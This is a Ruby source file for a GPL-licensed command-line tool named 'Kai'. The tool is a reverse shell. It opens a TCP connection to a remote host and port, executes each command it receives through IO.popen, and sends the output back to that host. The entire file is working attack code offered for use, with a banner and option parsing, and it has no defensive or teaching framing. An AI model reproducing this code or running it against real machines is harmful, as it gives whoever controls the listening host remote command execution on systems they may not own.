#!/usr/bin/env ruby

# Copyright 2023 Elijah Gordon (SLcK) <braindisassemblue@gmail.com>

# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

require 'socket'
require 'optparse'

class Kai
  BANNER = <<~BANNER
    ------------------------------------------------------------------------
                              __            __
                             |  | _________|__|
                             |  |/ /\\__  \\ |  |
                             |    <  / __ \\|  |
                             |__|_ \\(____  /__|
                                  \\/     \\/
    ------------------------------------------------------------------------
  BANNER

  VERSION = 'Version => Kai v1.0 Copyright 2023 SLcK <braindisassemblue@gmail.com>'

  def initialize
    puts BANNER
  end

  def parse_options(arguments)
    @options = {}
    @options[:port_remote] = nil

    OptionParser.new do |opts|
      opts.banner = "Usage: #{__FILE__} [options]"

      opts.on('-r', '--remote-host ', String,
              'The host to connect to') do |remote_host|
        @options[:remote_host] = remote_host
      end

      opts.on('-p', '--port-remote ', Integer,
              'The port to connect to') do |port_remote|
        @options[:port_remote] = port_remote
      end

      opts.on('-V', '--version', 'Show version and exit') do
        puts VERSION
        exit
      end

      opts.on('-h', '--help', 'Show help and exit') do
        puts opts
        exit
      end
    end.parse!(arguments)

    validate_options
  rescue OptionParser::ParseError => err
    puts '------------------------------------------------------------------------'
    puts "[!] #{err.message}"
    puts '------------------------------------------------------------------------'
    puts '[!] Exiting ..'
    puts '------------------------------------------------------------------------'
    exit
  end

  def validate_options
    if @options[:remote_host].nil?
      puts '------------------------------------------------------------------------'
      puts "[!] No host specified"
      puts '------------------------------------------------------------------------'
      puts '[!] Exiting ..'
      puts '------------------------------------------------------------------------'
      exit
    elsif @options[:port_remote].nil?
      puts '------------------------------------------------------------------------'
      puts "[!] No port specified"
      puts '------------------------------------------------------------------------'
      puts '[!] Exiting ..'
      puts '------------------------------------------------------------------------'
      exit
    end
  end

  def connect
    begin
      socket = TCPSocket.new(@options[:remote_host], @options[:port_remote])
    rescue SocketError, Errno::EHOSTUNREACH, Errno::ECONNREFUSED => err
      handle_connection_error("Error [1]: #{err}")
    rescue Errno::ETIMEDOUT, Errno::ENETUNREACH => err
      handle_connection_error("Error [2]: #{err}".red)
    end

    puts "[*] Starting at: (#{Time.now}) Operating System: (#{RUBY_PLATFORM})"
    puts '------------------------------------------------------------------------'
    puts "[*] Status: Connection Established!"
    puts "[*] Remote Host: #{@options[:remote_host]} Remote Port: #{@options[:port_remote]}"
    puts '------------------------------------------------------------------------'

    while (cmd = socket.gets)
      IO.popen(cmd, 'r') { |io| socket.print io.read }
    end
  end

  def handle_connection_error(error_message)
    puts '------------------------------------------------------------------------'
    puts "[!] #{error_message}"
    puts '------------------------------------------------------------------------'
    puts '[!] Exiting ..'
    puts '------------------------------------------------------------------------'
    exit
  end

  def run(arguments)
    if arguments.empty?
      show_menu
    else
      parse_options(arguments)
      connect
    end
  end

  def show_menu
    puts '------------------------------------------------------------------------'
    puts 'Welcome to Kai!'
    puts 'Please provide the necessary options to establish a remote connection.'
    puts 'Use -h or --help for more information.'
    puts '------------------------------------------------------------------------'
  end
end

shell = Kai.new
shell.run(ARGV)
